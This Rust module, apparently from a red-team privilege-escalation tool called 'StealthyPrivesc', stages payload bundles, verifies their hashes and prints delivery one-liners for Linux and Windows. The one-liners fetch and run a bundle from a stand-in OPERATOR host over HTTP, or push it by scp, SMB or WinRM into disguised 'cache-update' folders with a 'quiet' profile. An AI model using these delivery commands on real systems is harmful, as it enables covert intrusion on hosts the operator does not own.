//! Operator delivery kit: stage, verify, one-liners.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Command;

use anyhow::{bail, Context, Result};
use sha2::{Digest, Sha256};

use crate::core::artifacts::{self, ArtifactLedger};

pub fn sha256_file(path: &Path) -> Result<String> {
    let data = fs::read(path).with_context(|| format!("read {}", path.display()))?;
    let mut hasher = Sha256::new();
    hasher.update(&data);
    Ok(hex::encode(hasher.finalize()))
}

pub fn verify_local(path: &Path, expect_sha256: &str) -> Result<()> {
    let got = sha256_file(path)?;
    let expect = expect_sha256.trim().to_ascii_lowercase();
    if got != expect {
        bail!(
            "hash mismatch for {}: expected {}, got {}",
            path.display(),
            expect,
            got
        );
    }
    Ok(())
}

pub fn verify_ssh(ssh_target: &str, remote_path: &str, expect_sha256: &str) -> Result<()> {
    let output = Command::new("ssh")
        .args([
            ssh_target,
            &format!("sha256sum '{remote_path}' || shasum -a 256 '{remote_path}'"),
        ])
        .output()
        .context("spawn ssh for remote verify")?;
    if !output.status.success() {
        bail!(
            "remote hash failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    let got = stdout
        .split_whitespace()
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();
    let expect = expect_sha256.trim().to_ascii_lowercase();
    if got != expect {
        bail!("remote hash mismatch: expected {expect}, got {got}");
    }
    Ok(())
}

pub struct StageOptions<'a> {
    pub os: &'a str,
    pub arch: &'a str,
    pub name: &'a str,
    pub out_dir: &'a Path,
    pub binary: Option<&'a Path>,
    pub run_id: &'a str,
    pub ledger_dir: &'a Path,
}

pub fn stage(opts: StageOptions<'_>) -> Result<PathBuf> {
    if opts.out_dir.exists() {
        if !opts.out_dir.is_dir() {
            bail!(
                "stage output is not a directory: {}",
                opts.out_dir.display()
            );
        }
        if fs::read_dir(opts.out_dir)?.next().transpose()?.is_some() {
            bail!(
                "stage output directory must be empty: {}",
                opts.out_dir.display()
            );
        }
    }
    fs::create_dir_all(opts.out_dir)?;
    let bin_name = if opts.os == "windows" {
        format!("{}.exe", opts.name)
    } else {
        opts.name.to_string()
    };
    let dest_bin = opts.out_dir.join(&bin_name);

    if let Some(src) = opts.binary {
        fs::copy(src, &dest_bin)
            .with_context(|| format!("copy {} -> {}", src.display(), dest_bin.display()))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = fs::metadata(&dest_bin)?.permissions();
            perms.set_mode(0o750);
            fs::set_permissions(&dest_bin, perms)?;
        }
    } else {
        // Placeholder notice when no binary provided.
        let mut f = fs::File::create(&dest_bin)?;
        writeln!(
            f,
            "PLACEHOLDER: pass --binary PATH to stage a real stealthy artifact for {}/{}",
            opts.os, opts.arch
        )?;
    }

    // Copy script fallbacks when present. Prefer cwd / exe-adjacent paths (no
    // absolute build-machine CARGO_MANIFEST_DIR embedding in release binaries).
    let scripts_rel = if opts.os == "windows" {
        "scripts/windows"
    } else {
        "scripts/linux"
    };
    let mut candidates = vec![PathBuf::from(scripts_rel)];
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            candidates.push(dir.join(scripts_rel));
            candidates.push(dir.join("../").join(scripts_rel));
            candidates.push(dir.join("../../").join(scripts_rel));
        }
    }
    let scripts_src = candidates
        .into_iter()
        .find(|path| path.is_dir())
        .unwrap_or_else(|| PathBuf::from(scripts_rel));
    let scripts_dst = opts.out_dir.join("scripts");
    fs::create_dir_all(&scripts_dst)?;
    if scripts_src.is_dir() {
        copy_dir_recursive(&scripts_src, &scripts_dst)?;
    }

    let fallback_order = if opts.os == "windows" {
        "powershell"
    } else {
        "python,bash"
    };
    let manifest = format!(
        "# Generated dispatcher manifest — inherits the primary-run authorization context.\n\
         manifest_version=1\n\
         authorization_ack=true\n\
         operator_ack_required=true\n\
         allow_fallback=true\n\
         roe_ref=INHERITED_PRIMARY_RUN\n\
         execution_mode=enumerate-only\n\
         target_hostname=AUTO\n\
         target_username=\n\
         drop_dir=\n\
         primary_binary={bin_name}\n\
         {os_key}_fallbacks={fallback_order}\n",
        os_key = if opts.os == "windows" {
            "windows"
        } else {
            "linux"
        },
    );
    fs::write(scripts_dst.join("stealthy-run.conf"), manifest)
        .with_context(|| format!("write {} dispatcher manifest", opts.os))?;

    let hash = if dest_bin.is_file() {
        sha256_file(&dest_bin).unwrap_or_else(|_| "unavailable".into())
    } else {
        "unavailable".into()
    };
    fs::write(
        opts.out_dir.join("SHA256SUMS"),
        format!("{hash}  {bin_name}\n"),
    )?;

    let operator = format!(
        "StealthyPrivesc stage bundle\n\
         os={} arch={} name={}\n\
         binary_sha256={}\n\n\
         Verify:\n  stealthy verify --path ./{bin_name} --expect-sha256 {hash}\n\n\
         Enumerate (requires a fresh operator acknowledgment):\n  {} ./scripts/{} --authorized --profile balanced enum\n\n\
         Cleanup:\n  stealthy cleanup --latest --secure-delete\n",
        opts.os,
        opts.arch,
        opts.name,
        hash,
        if opts.os == "windows" { "&" } else { "bash" },
        if opts.os == "windows" {
            "run.ps1"
        } else {
            "run.sh"
        }
    );
    fs::write(opts.out_dir.join("OPERATOR.txt"), operator)?;

    let mut ledger = ArtifactLedger::new(opts.run_id);
    ledger.register("stage_bundle", opts.out_dir, true, "staged delivery bundle");
    ledger.register("binary_drop", &dest_bin, true, "staged binary");
    ledger.register(
        "stage_bundle",
        opts.out_dir.join("SHA256SUMS"),
        true,
        "checksums",
    );
    artifacts::save_ledger(opts.ledger_dir, &ledger)?;
    Ok(opts.out_dir.to_path_buf())
}

fn copy_dir_recursive(src: &Path, dst: &Path) -> Result<()> {
    fs::create_dir_all(dst)?;
    for ent in fs::read_dir(src)? {
        let ent = ent?;
        let ty = ent.file_type()?;
        let to = dst.join(ent.file_name());
        if ty.is_dir() {
            copy_dir_recursive(&ent.path(), &to)?;
        } else if ty.is_file() {
            fs::copy(ent.path(), &to)?;
        }
    }
    Ok(())
}

pub fn one_liners(os: &str, transport: &str) -> String {
    match (os, transport) {
        ("linux", "ssh") | ("linux", "scp") => r#"# SCP approved bundle + dispatcher
scp -r ./drop user@host:/tmp/cache-update
ssh user@host 'bash /tmp/cache-update/scripts/run.sh --authorized --profile quiet enum'
"#.into(),
        ("linux", "http") => r#"# HTTP pull of an approved bundle
curl -fsSL http://OPERATOR:8000/drop.tar.gz | tar -xz -C /tmp/cache-update
bash /tmp/cache-update/scripts/run.sh --authorized --profile quiet enum
"#.into(),
        ("windows", "winrm") => r#"# WinRM copy + policy-bound dispatcher
Copy-Item -Recurse .\drop \\HOST\C$\Users\Public\Documents\cache-update
Invoke-Command -ComputerName HOST -ScriptBlock {
  & 'C:\Users\Public\Documents\cache-update\scripts\run.ps1' --authorized --profile quiet enum
}
"#.into(),
        ("windows", "smb") => r#"# SMB approved bundle + dispatcher
$Dir = '\\HOST\C$\Users\Public\Documents\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Copy-Item -Recurse .\drop\* $Dir
Invoke-Command -ComputerName HOST -ScriptBlock {
  & 'C:\Users\Public\Documents\cache-update\scripts\run.ps1' --authorized --profile quiet enum
}
"#.into(),
        ("windows", "http") => r#"# HTTP pull on Windows
Invoke-WebRequest -Uri http://OPERATOR:8000/drop.zip -OutFile $env:TEMP\stealthy-drop.zip
Expand-Archive -Force $env:TEMP\stealthy-drop.zip $env:TEMP\stealthy-drop
& "$env:TEMP\stealthy-drop\scripts\run.ps1" --authorized --profile quiet enum
"#.into(),
        ("linux", "smb") => r#"# Copy from mounted engagement share
mkdir -p /tmp/cache-update
cp -R /mnt/engagement-share/drop/. /tmp/cache-update/
bash /tmp/cache-update/scripts/run.sh --authorized --profile quiet enum
"#.into(),
        _ => format!(
            "# No built-in snippet for os={os} transport={transport}\n# Supported: linux:(ssh|scp|http|smb) windows:(winrm|smb|http)\n"
        ),
    }
}
